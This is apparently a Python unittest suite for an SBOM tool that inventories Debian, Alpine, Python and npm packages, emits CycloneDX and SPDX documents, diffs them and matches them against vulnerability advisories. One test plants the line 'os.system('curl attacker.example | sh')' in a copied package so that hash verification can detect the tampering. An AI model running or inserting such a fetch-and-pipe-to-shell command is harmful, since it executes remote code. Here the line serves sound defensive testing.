import base64
import io
import json
import os
import shutil
import sys
import tarfile
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from io import StringIO

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import main  # noqa: E402

FIXTURES = os.path.join(os.path.dirname(__file__), "..", "fixtures")
DEBIAN_V1 = os.path.join(FIXTURES, "debian-v1")
DEBIAN_V2 = os.path.join(FIXTURES, "debian-v2")
ALPINE = os.path.join(FIXTURES, "alpine")
ADVISORIES = os.path.join(FIXTURES, "advisories")
STAMP = "2026-01-01T00:00:00Z"


def run(argv):
    out, err = StringIO(), StringIO()
    with redirect_stdout(out), redirect_stderr(err):
        code = main.main(argv)
    return code, out.getvalue(), err.getvalue()


def scan(path, verify=False):
    tree = main.open_tree(path)
    try:
        return main.inventory(tree, verify=verify)
    finally:
        tree.close()


def by_name(inv):
    return {(p.type, p.display, p.version): p for p in inv.packages}


def tar_of(directory, target):
    with tarfile.open(target, "w") as archive:
        for name in sorted(os.listdir(directory)):
            archive.add(os.path.join(directory, name), arcname=name)
    return target


class TempTree(unittest.TestCase):
    def setUp(self):
        self.root = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.root, ignore_errors=True)

    def write(self, path, text):
        full = os.path.join(self.root, path)
        os.makedirs(os.path.dirname(full), exist_ok=True)
        with open(full, "w", encoding="utf-8") as handle:
            handle.write(text)
        return full


class VersionOrderTests(unittest.TestCase):
    def assertOrder(self, kind, a, b, expected):
        symbol = {-1: "<", 0: "=", 1: ">"}[main.compare_versions(kind, a, b)]
        self.assertEqual(symbol, expected, f"{kind}: {a} {symbol} {b}, want {expected}")
        mirrored = {"<": ">", ">": "<", "=": "="}[expected]
        self.assertEqual({-1: "<", 0: "=", 1: ">"}[main.compare_versions(kind, b, a)], mirrored)

    def test_dpkg_epochs_tildes_and_revisions_follow_dpkg(self):
        self.assertOrder("deb", "1:1.0", "2.0", ">")
        self.assertOrder("deb", "1.0~rc1", "1.0", "<")
        self.assertOrder("deb", "1.0~~", "1.0~", "<")
        self.assertOrder("deb", "1.0a", "1.0+", "<")
        self.assertOrder("deb", "3.0.11-1~deb12u2", "3.0.11-1", "<")
        self.assertOrder("deb", "2.36-9+deb12u4", "2.36-9+deb12u10", "<")
        self.assertOrder("deb", "1.0", "1.0-0", "=")
        with self.assertRaises(main.VersionError):
            main.compare_dpkg("x:1.0", "1.0")

    def test_apk_suffixes_letters_and_revisions_follow_apk_tools(self):
        self.assertOrder("apk", "1.2.3_rc1", "1.2.3", "<")
        self.assertOrder("apk", "1.2.3", "1.2.3_p1", "<")
        self.assertOrder("apk", "1.2.3_alpha", "1.2.3_beta", "<")
        self.assertOrder("apk", "1.2.3-r9", "1.2.3-r10", "<")
        self.assertOrder("apk", "1.2.3_rc1-r1", "1.2.3-r0", "<")
        self.assertOrder("apk", "1.2.3", "1.2.3a", "<")
        self.assertOrder("apk", "1.37.0-r18", "1.36.1-r27", ">")
        with self.assertRaises(main.VersionError):
            main.compare_apk("1.2-foo", "1.2")

    def test_pep440_orders_dev_pre_post_epoch_and_local(self):
        chain = ["1.0.dev0", "1.0a1.dev1", "1.0a1", "1.0b1", "1.0rc1", "1.0", "1.0+abc", "1.0+1", "1.0.post1.dev1", "1.0.post1", "1.1", "1!0.1"]
        for lower, higher in zip(chain, chain[1:]):
            self.assertOrder("pypi", lower, higher, "<")
        self.assertOrder("pypi", "1.0", "1.0.0", "=")
        self.assertOrder("pypi", "1.0c1", "1.0rc1", "=")
        self.assertOrder("pypi", "1.0-1", "1.0.post1", "=")
        with self.assertRaises(main.VersionError):
            main.compare_pep440("1.0-foo", "1.0")

    def test_semver_precedence_is_the_example_from_the_specification(self):
        chain = ["1.0.0-alpha", "1.0.0-alpha.1", "1.0.0-alpha.beta", "1.0.0-beta", "1.0.0-beta.2", "1.0.0-beta.11", "1.0.0-rc.1", "1.0.0"]
        for lower, higher in zip(chain, chain[1:]):
            self.assertOrder("npm", lower, higher, "<")
        self.assertOrder("npm", "1.0.0+build.5", "1.0.0", "=")
        with self.assertRaises(main.VersionError):
            main.compare_semver("1.0", "1.0.0")

    def test_every_pair_in_the_fixture_that_the_smoke_asks_the_real_tools(self):
        with open(os.path.join(FIXTURES, "version-pairs.json"), encoding="utf-8") as handle:
            pairs = json.load(handle)
        for kind in main.TYPES:
            self.assertGreaterEqual(len(pairs[kind]), 10)
            for a, b, expected in pairs[kind]:
                self.assertOrder(kind, a, b, expected)


class PurlTests(unittest.TestCase):
    def test_purls_encode_versions_namespaces_and_sorted_qualifiers(self):
        login = main.Package("deb", "login", "1:4.13+dfsg1-1", namespace="debian", arch="amd64", distro="debian-12", source="shadow", source_version="1:4.13+dfsg1-1")
        self.assertEqual(login.purl, "pkg:deb/debian/login@1:4.13%2Bdfsg1-1?arch=amd64&distro=debian-12&upstream=shadow")
        binnmu = main.Package("deb", "libfoo1", "1.2-3+b1", namespace="debian", source="foo", source_version="1.2-3")
        self.assertEqual(binnmu.qualifiers()["upstream"], "foo@1.2-3")
        self.assertEqual(main.Package("npm", "traverse", "7.23.1", namespace="@babel").purl, "pkg:npm/%40babel/traverse@7.23.1")
        self.assertEqual(main.Package("pypi", "Typing_Extensions", "4.12.2").purl, "pkg:pypi/typing-extensions@4.12.2")

    def test_parse_purl_decodes_what_other_tools_encode(self):
        parsed = main.parse_purl("pkg:deb/debian/login@1%3A4.13%2Bdfsg1-1?arch=amd64&upstream=shadow&distro=debian-12")
        self.assertEqual((parsed.type, parsed.namespace, parsed.name, parsed.version), ("deb", "debian", "login", "1:4.13+dfsg1-1"))
        self.assertEqual(parsed.qualifiers, {"arch": "amd64", "upstream": "shadow", "distro": "debian-12"})
        scoped = main.parse_purl("pkg:npm/@babel/traverse@7.23.1")
        self.assertEqual((scoped.namespace, scoped.name, scoped.version), ("@babel", "traverse", "7.23.1"))
        self.assertEqual(main.parse_purl("pkg:pypi/idna").version, "")
        for bad in ("npm/left-pad@1.0.0", "pkg:npm"):
            with self.assertRaises(main.InputError):
                main.parse_purl(bad)


class TreeTests(TempTree):
    def test_symlinks_resolve_inside_the_root_never_on_the_host(self):
        self.write("usr/lib/os-release", 'ID=debian\nVERSION_ID="13"\nVERSION_CODENAME=trixie\n')
        os.makedirs(os.path.join(self.root, "etc"))
        os.symlink("/usr/lib/os-release", os.path.join(self.root, "etc", "os-release"))
        os.symlink("../../../../../../../etc/hostname", os.path.join(self.root, "etc", "escape"))
        tree = main.DirTree(self.root)
        self.assertEqual(tree.resolve("etc/os-release"), "usr/lib/os-release")
        self.assertEqual(tree.resolve("etc/escape"), "etc/hostname")
        self.assertIsNone(tree.read("etc/escape"))
        distro = main.read_distro(tree)
        self.assertEqual((distro.id, distro.version, distro.qualifier), ("debian", "13", "debian-13"))
        os.symlink("loop-b", os.path.join(self.root, "loop-a"))
        os.symlink("loop-a", os.path.join(self.root, "loop-b"))
        with self.assertRaises(main.InputError):
            tree.resolve("loop-a/x")

    def test_a_tar_export_and_the_directory_give_the_same_inventory(self):
        archive = tar_of(DEBIAN_V1, os.path.join(self.root, "export.tar"))
        expected = [p.purl for p in scan(DEBIAN_V1).packages]
        self.assertEqual(len(expected), 14)
        self.assertEqual([p.purl for p in scan(archive).packages], expected)
        with tarfile.open(os.path.join(self.root, "export.tar.gz"), "w:gz") as gz:
            for name in sorted(os.listdir(DEBIAN_V1)):
                gz.add(os.path.join(DEBIAN_V1, name), arcname="./" + name)
        self.assertEqual([p.purl for p in scan(os.path.join(self.root, "export.tar.gz")).packages], expected)

        class Stdin:
            def __init__(self, data):
                self.buffer = io.BytesIO(data)

        saved = sys.stdin
        with open(archive, "rb") as handle:
            sys.stdin = Stdin(handle.read())
        try:
            from_stdin = scan("-")
        finally:
            sys.stdin = saved
        self.assertEqual(([p.purl for p in from_stdin.packages], from_stdin.source), (expected, "stdin"))

    def test_docker_save_archives_and_non_archives_are_refused_with_a_hint(self):
        self.write("save/manifest.json", "[]")
        self.write("save/blobs/sha256/abc", "layer")
        save = tar_of(os.path.join(self.root, "save"), os.path.join(self.root, "image.tar"))
        code, _, err = run(["scan", save])
        self.assertEqual(code, 2)
        self.assertIn("docker save", err)
        code, _, err = run(["scan", self.write("notes.txt", "hello")])
        self.assertEqual(code, 2)
        self.assertIn("docker export", err)
        self.assertEqual(run(["scan", os.path.join(self.root, "missing")])[0], 2)


class InventoryTests(TempTree):
    def test_dpkg_skips_removed_packages_and_keeps_source_epoch_and_licences(self):
        packages = by_name(scan(DEBIAN_V1))
        self.assertNotIn(("deb", "vim-tiny", "2:9.0.1378-2"), packages)
        login = packages[("deb", "login", "1:4.13+dfsg1-1")]
        self.assertEqual((login.source, login.arch, login.distro, login.namespace), ("shadow", "amd64", "debian-12", "debian"))
        self.assertEqual(login.licenses, ["BSD-3-clause", "GPL-2+"])
        self.assertEqual(main.declared_license(login.licenses), "BSD-3-Clause AND GPL-2.0-or-later")
        self.assertEqual(packages[("deb", "tzdata", "2024a-0+deb12u1")].licenses, [])
        self.assertEqual(packages[("deb", "tzdata", "2024a-0+deb12u1")].arch, "all")

    def test_distroless_status_d_files_are_read_and_md5sums_ignored(self):
        self.write("etc/os-release", "ID=debian\nVERSION_ID=12\n")
        self.write("var/lib/dpkg/status.d/libssl3", "Package: libssl3\nVersion: 3.0.15-1~deb12u1\nArchitecture: amd64\nSource: openssl\n")
        self.write("var/lib/dpkg/status.d/libssl3.md5sums", "d41d8cd98f00b204e9800998ecf8427e  usr/lib/libssl.so.3\n")
        self.write("var/lib/dpkg/status.d/tzdata", "Package: tzdata\nVersion: 2025b-0+deb12u1\nArchitecture: all\n")
        names = sorted(p.display for p in scan(self.root).packages)
        self.assertEqual(names, ["libssl3", "tzdata"])
        self.write("var/lib/dpkg/status", "Package: broken\nthis line has no colon\n")
        with self.assertRaises(main.InputError) as caught:
            scan(self.root)
        self.assertIn("var/lib/dpkg/status:2", str(caught.exception))

    def test_apk_installed_database_gives_origin_licence_and_file_count(self):
        inv = scan(ALPINE)
        self.assertEqual(inv.distro.qualifier, "alpine-3.19.1")
        packages = by_name(inv)
        binsh = packages[("apk", "busybox-binsh", "1.36.1-r15")]
        self.assertEqual((binsh.source, binsh.arch, binsh.licenses, binsh.files), ("busybox", "x86_64", ["GPL-2.0-only"], 1))
        self.assertEqual(binsh.purl, "pkg:apk/alpine/busybox-binsh@1.36.1-r15?arch=x86_64&distro=alpine-3.19.1&upstream=busybox")
        self.assertNotIn("upstream", packages[("apk", "busybox", "1.36.1-r15")].qualifiers())

    def test_python_metadata_licences_and_record_hashes(self):
        packages = by_name(scan(DEBIAN_V1, verify=True))
        idna, six = packages[("pypi", "idna", "3.6")], packages[("pypi", "six", "1.16.0")]
        self.assertEqual((idna.licenses, idna.files, idna.modified), (["BSD License"], 5, []))
        self.assertEqual(six.licenses, ["MIT"])
        self.assertIsNone(main.declared_license(idna.licenses))
        copy = os.path.join(self.root, "rootfs")
        shutil.copytree(DEBIAN_V1, copy)
        with open(os.path.join(copy, "usr/local/lib/python3.12/site-packages/idna/__init__.py"), "a", encoding="utf-8") as handle:
            handle.write("import os; os.system('curl attacker.example | sh')\n")
        os.remove(os.path.join(copy, "usr/local/lib/python3.12/site-packages/six.py"))
        tampered = by_name(scan(copy, verify=True))
        self.assertEqual(tampered[("pypi", "idna", "3.6")].modified, ["idna/__init__.py"])
        self.assertEqual(tampered[("pypi", "six", "1.16.0")].modified, ["six.py (missing)"])
        code, out, _ = run(["scan", copy, "--verify-records"])
        self.assertEqual(code, 1)
        self.assertIn("MODIFIED idna 3.6: idna/__init__.py", out)

    def test_npm_lock_versions_three_and_one_with_scopes_links_and_nesting(self):
        packages = by_name(scan(DEBIAN_V1))
        self.assertIn(("npm", "ms", "2.1.2"), packages)
        self.assertIn(("npm", "ms", "2.1.3"), packages)
        self.assertTrue(packages[("npm", "left-pad", "1.3.0")].dev)
        self.assertNotIn(("npm", "cc-demo-app", "1.0.0"), packages)
        self.assertEqual(packages[("npm", "@babel/traverse", "7.23.1")].namespace, "@babel")
        lock = {"lockfileVersion": 3, "packages": {"": {"name": "app"}, "node_modules/lib": {"link": True, "resolved": "packages/lib"}, "packages/lib": {"name": "lib", "version": "0.1.0"}, "node_modules/string-width-cjs": {"name": "string-width", "version": "4.2.3"}}}
        self.write("app/package-lock.json", json.dumps(lock))
        self.write("app/node_modules/x/package-lock.json", "not json, and never read")
        v1 = {"lockfileVersion": 1, "dependencies": {"debug": {"version": "2.6.9", "dependencies": {"ms": {"version": "2.0.0"}}}, "mocha": {"version": "10.2.0", "dev": True}}}
        self.write("old/package-lock.json", json.dumps(v1))
        found = sorted((p.display, p.version, p.dev) for p in scan(self.root).packages)
        self.assertEqual(found, [("debug", "2.6.9", False), ("lib", "0.1.0", False), ("mocha", "10.2.0", True), ("ms", "2.0.0", False), ("string-width", "4.2.3", False)])
        self.write("bad/package-lock.json", "{")
        with self.assertRaises(main.InputError):
            scan(self.root)


class DocumentTests(TempTree):
    def test_cyclonedx_document_is_1_6_with_purls_licences_and_a_stable_serial(self):
        inv = scan(DEBIAN_V1)
        doc = main.cyclonedx(inv, "debian-v1", STAMP)
        self.assertEqual((doc["bomFormat"], doc["specVersion"], doc["version"]), ("CycloneDX", "1.6", 1))
        self.assertEqual(doc["serialNumber"], main.cyclonedx(scan(DEBIAN_V1), "debian-v1", STAMP)["serialNumber"])
        self.assertNotEqual(doc["serialNumber"], main.cyclonedx(inv, "debian-v1", "2026-01-02T00:00:00Z")["serialNumber"])
        components = {c["bom-ref"]: c for c in doc["components"]}
        self.assertEqual(len(components), len(doc["components"]))
        self.assertEqual(components["os:debian-12"]["type"], "operating-system")
        libc = next(c for c in doc["components"] if c["name"] == "libc6")
        self.assertEqual(libc["licenses"], [{"license": {"id": "LGPL-2.1-or-later"}}, {"license": {"id": "GPL-2.0-or-later"}}])
        idna = next(c for c in doc["components"] if c["name"] == "idna")
        self.assertEqual(idna["licenses"], [{"license": {"name": "BSD License"}}])
        self.assertEqual(main.cyclonedx_licenses(["MIT OR Apache-2.0"]), [{"expression": "MIT OR Apache-2.0"}])
        self.assertEqual(doc["metadata"]["tools"]["components"][0]["name"], "minisbom")

    def test_spdx_document_is_2_3_with_unique_ids_and_purl_external_refs(self):
        doc = main.spdx(scan(DEBIAN_V1), "debian-v1", STAMP)
        self.assertEqual((doc["spdxVersion"], doc["dataLicense"], doc["SPDXID"]), ("SPDX-2.3", "CC0-1.0", "SPDXRef-DOCUMENT"))
        ids = [p["SPDXID"] for p in doc["packages"]]
        self.assertEqual(len(ids), len(set(ids)))
        for spdx_id in ids:
            self.assertRegex(spdx_id, r"^SPDXRef-[A-Za-z0-9.-]+$")
        login = next(p for p in doc["packages"] if p["name"] == "login")
        self.assertEqual(login["licenseDeclared"], "BSD-3-Clause AND GPL-2.0-or-later")
        self.assertEqual(login["externalRefs"][0]["referenceCategory"], "PACKAGE-MANAGER")
        describes = [r for r in doc["relationships"] if r["relationshipType"] == "DESCRIBES"]
        self.assertEqual(describes, [{"spdxElementId": "SPDXRef-DOCUMENT", "relationshipType": "DESCRIBES", "relatedSpdxElement": "SPDXRef-Subject"}])
        self.assertEqual(doc["creationInfo"], {"created": STAMP, "creators": ["Tool: minisbom-0.1.0"]})

    def test_documents_read_back_and_syft_style_encodings_load(self):
        inv = scan(DEBIAN_V1)
        expected = sorted(p.purl for p in inv.packages)
        for writer in (main.cyclonedx, main.spdx):
            path = self.write(f"{writer.__name__}.json", json.dumps(writer(inv, "debian-v1", STAMP)))
            sbom = main.load_sbom(path)
            self.assertEqual(sorted(c.purl for c in sbom.components), expected)
            self.assertEqual(sbom.os, "debian 12")
        syft_like = {
            "bomFormat": "CycloneDX", "specVersion": "1.6",
            "components": [
                {"type": "library", "name": "login", "version": "1:4.13+dfsg1-1", "purl": "pkg:deb/debian/login@1%3A4.13%2Bdfsg1-1?arch=amd64&upstream=shadow&distro=debian-12"},
                {"type": "application", "name": "python", "version": "3.12.12", "purl": "pkg:generic/python@3.12.12"},
                {"type": "operating-system", "name": "debian", "version": "12"},
                {"type": "library", "name": "outer", "version": "1.0.0", "purl": "pkg:npm/outer@1.0.0", "components": [{"type": "library", "name": "inner", "version": "2.0.0", "purl": "pkg:npm/inner@2.0.0"}]},
            ],
        }
        statement = {"_type": "https://in-toto.io/Statement/v0.1", "predicateType": "https://cyclonedx.org/bom", "predicate": syft_like}
        envelope = {"payloadType": "application/vnd.in-toto+json", "payload": base64.b64encode(json.dumps(statement).encode()).decode(), "signatures": []}
        for document in (syft_like, statement, envelope):
            sbom = main.load_sbom(self.write("doc.json", json.dumps(document)))
            self.assertEqual(sorted((c.type, c.display, c.version) for c in sbom.components), [("deb", "login", "1:4.13+dfsg1-1"), ("generic", "python", "3.12.12"), ("npm", "inner", "2.0.0"), ("npm", "outer", "1.0.0")])
        with self.assertRaises(main.InputError):
            main.load_sbom(self.write("other.json", json.dumps({"hello": "world"})))

    def test_scan_formats_and_source_date_epoch(self):
        code, out, _ = run(["scan", DEBIAN_V1])
        self.assertEqual(code, 0)
        self.assertIn("14 packages: deb 6, pypi 2, npm 6", out)
        code, out, _ = run(["scan", DEBIAN_V1, "--json"])
        self.assertEqual(json.loads(out)["counts"], {"deb": 6, "pypi": 2, "npm": 6})
        target = os.path.join(self.root, "sbom.cdx.json")
        code, _, err = run(["scan", DEBIAN_V1, "--format", "cyclonedx", "--output", target, "--timestamp", STAMP])
        self.assertEqual(code, 0)
        self.assertIn("14 packages", err)
        with open(target, encoding="utf-8") as handle:
            self.assertEqual(json.load(handle)["metadata"]["timestamp"], STAMP)
        self.assertEqual(main.document_time(None, {"SOURCE_DATE_EPOCH": "1767225600"}), STAMP)
        self.assertEqual(run(["scan", DEBIAN_V1, "--timestamp", "yesterday"])[0], 2)


class DiffTests(TempTree):
    def test_diff_of_two_filesystems_reports_planted_changes_with_direction(self):
        code, out, _ = run(["diff", DEBIAN_V1, DEBIAN_V2, "--json"])
        self.assertEqual(code, 1)
        result = json.loads(out)
        self.assertEqual([(c["type"], c["name"], c["version"]) for c in result["added"]], [("deb", "less", "590-2.1~deb12u2")])
        self.assertEqual([(c["type"], c["name"]) for c in result["removed"]], [("deb", "tzdata"), ("pypi", "six")])
        changed = {(c["type"], c["name"]): (c["from"], c["to"], c["direction"]) for c in result["changed"]}
        self.assertEqual(changed[("deb", "libc6")], ("2.36-9+deb12u4", "2.36-9+deb12u10", "upgrade"))
        self.assertEqual(changed[("npm", "@babel/traverse")], ("7.23.1", "7.23.2", "upgrade"))
        self.assertEqual(len(changed), 7)
        self.assertEqual(run(["diff", DEBIAN_V1, DEBIAN_V1])[0:2], (0, "no changes\n"))

    def test_diff_across_formats_handles_duplicates_downgrades_and_os_changes(self):
        def doc(os_version, components):
            items = [{"type": "operating-system", "name": "debian", "version": os_version}]
            items += [{"type": "library", "name": n, "version": v, "purl": p} for n, v, p in components]
            return self.write(f"{os_version}.json", json.dumps({"bomFormat": "CycloneDX", "specVersion": "1.6", "components": items}))
        old = doc("12", [("ms", "2.1.2", "pkg:npm/ms@2.1.2"), ("ms", "2.1.3", "pkg:npm/ms@2.1.3"), ("Typing_Extensions", "4.12.2", "pkg:pypi/Typing_Extensions@4.12.2")])
        new = doc("13", [("ms", "2.1.3", "pkg:npm/ms@2.1.3"), ("typing-extensions", "4.12.0", "pkg:pypi/typing-extensions@4.12.0")])
        result = main.diff(main.load_sbom(old), main.load_sbom(new))
        self.assertEqual(result.os_change, ("debian 12", "debian 13"))
        self.assertEqual([(c.display, c.version) for c in result.removed], [("ms", "2.1.2")])
        self.assertEqual([(c.new.display, c.old.version, c.new.version, c.direction) for c in result.changed], [("typing-extensions", "4.12.2", "4.12.0", "downgrade")])


class MatchTests(TempTree):
    def test_osv_events_introduced_fixed_last_affected_and_limit(self):
        compare = main.compare_semver
        two_ranges = [{"introduced": "1.0.0"}, {"fixed": "1.5.0"}, {"introduced": "2.0.0"}, {"fixed": "2.5.0"}]
        expected = {"0.9.0": False, "1.0.0": True, "1.4.9": True, "1.5.0": False, "1.9.9": False, "2.0.0-rc.1": False, "2.4.0": True, "2.5.0": False}
        for version, affected in expected.items():
            self.assertEqual(main.in_range(version, two_ranges, compare), affected, version)
        self.assertTrue(main.in_range("3.0.0", [{"introduced": "0"}, {"last_affected": "3.0.0"}], compare))
        self.assertFalse(main.in_range("3.0.1", [{"introduced": "0"}, {"last_affected": "3.0.0"}], compare))
        self.assertTrue(main.in_range("9.0.0", [{"introduced": "0"}], compare))
        self.assertFalse(main.in_range("4.0.0", [{"introduced": "0"}, {"limit": "4.0.0"}], compare))
        self.assertTrue(main.in_range("8.0.0-alpha.3", [{"introduced": "8.0.0-alpha.0"}, {"fixed": "8.0.0-alpha.4"}], compare))

    def test_fixture_advisories_flag_v1_and_clear_v2(self):
        code, out, _ = run(["match", DEBIAN_V1, "--advisories", ADVISORIES, "--json"])
        self.assertEqual(code, 1)
        report = json.loads(out)
        hits = sorted((f["advisory"], f["package"]["name"], f["package"]["version"]) for f in report["findings"])
        self.assertEqual(hits, [
            ("DEBIAN-CVE-2023-29383", "login", "1:4.13+dfsg1-1"),
            ("DEBIAN-CVE-2023-29383", "passwd", "1:4.13+dfsg1-1"),
            ("GHSA-67hx-6x53-jw92", "@babel/traverse", "7.23.1"),
            ("GHSA-c2qf-rxjj-qqgw", "semver", "7.5.1"),
            ("GHSA-jjg7-2v4v-x38h", "idna", "3.6"),
        ])
        login = next(f for f in report["findings"] if f["package"]["name"] == "login")
        self.assertEqual(login["matched"], {"name": "shadow", "version": "1:4.13+dfsg1-1", "ecosystem": "Debian:12"})
        self.assertEqual(login["fixed"], ["1:4.13+dfsg1-1+deb12u1"])
        self.assertEqual(report["advisories"], 5)
        code, out, _ = run(["match", DEBIAN_V2, "--advisories", ADVISORIES])
        self.assertEqual(code, 0)
        self.assertIn("0 finding(s) in 13 packages", out)

    def test_alpine_origin_matches_every_subpackage_and_releases_must_agree(self):
        findings, _ = main.match(main.load_sbom(ALPINE), main.load_advisories(ADVISORIES))
        self.assertEqual(sorted(f.component.display for f in findings), ["busybox", "busybox-binsh", "ssl_client"])
        self.assertEqual({f.ecosystem for f in findings}, {"Alpine:v3.19"})
        self.assertTrue(main.ecosystem_matches("Ubuntu:24.04:LTS", "Ubuntu:24.04"))
        self.assertTrue(main.ecosystem_matches("Debian", "Debian:13"))
        self.assertFalse(main.ecosystem_matches("Alpine:v3.19", "Alpine:v3.22"))
        newer = {"bomFormat": "CycloneDX", "components": [{"type": "library", "name": "busybox", "version": "1.37.0-r18", "purl": "pkg:apk/alpine/busybox@1.37.0-r18?arch=x86_64&distro=alpine-3.22.2"}]}
        self.assertEqual(main.match(main.load_sbom(self.write("newer.json", json.dumps(newer))), main.load_advisories(ADVISORIES))[0], [])

    def test_versions_lists_unparseable_versions_and_bad_advisory_files(self):
        advisory = {"id": "TEST-1", "affected": [{"package": {"ecosystem": "PyPI", "name": "Flask_Login"}, "versions": ["0.6.2"], "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.6.0"}]}]}]}
        sbom = main.Sbom("t", [
            main.Component("pypi", "", "flask-login", "0.6.2", {}, "pkg:pypi/flask-login@0.6.2"),
            main.Component("pypi", "", "flask-login", "not-a-version", {}, "pkg:pypi/flask-login@not-a-version"),
        ])
        findings, notes = main.match(sbom, [advisory])
        self.assertEqual([(f.component.version, f.reason) for f in findings], [("0.6.2", "version 0.6.2 is listed in versions")])
        self.assertEqual(len(notes), 1)
        self.assertIn("not-a-version", notes[0])
        self.write("advisories/one.json", json.dumps({"vulns": [advisory]}))
        self.write("advisories/two.json", json.dumps([advisory]))
        self.assertEqual(len(main.load_advisories(os.path.join(self.root, "advisories"))), 2)
        self.write("advisories/three.json", json.dumps({"hello": "world"}))
        code, _, err = run(["match", DEBIAN_V1, "--advisories", os.path.join(self.root, "advisories")])
        self.assertEqual(code, 2)
        self.assertIn("three.json", err)


class CompareCommandTests(unittest.TestCase):
    def test_compare_prints_the_symbol_the_package_manager_would(self):
        self.assertEqual(run(["compare", "deb", "1:1.0", "2.0"])[0:2], (0, ">\n"))
        self.assertEqual(json.loads(run(["compare", "apk", "1.2.3_rc1", "1.2.3", "--json"])[1])["result"], "<")
        code, _, err = run(["compare", "npm", "1.0", "1.0.0"])
        self.assertEqual(code, 2)
        self.assertIn("SemVer", err)


if __name__ == "__main__":
    unittest.main()
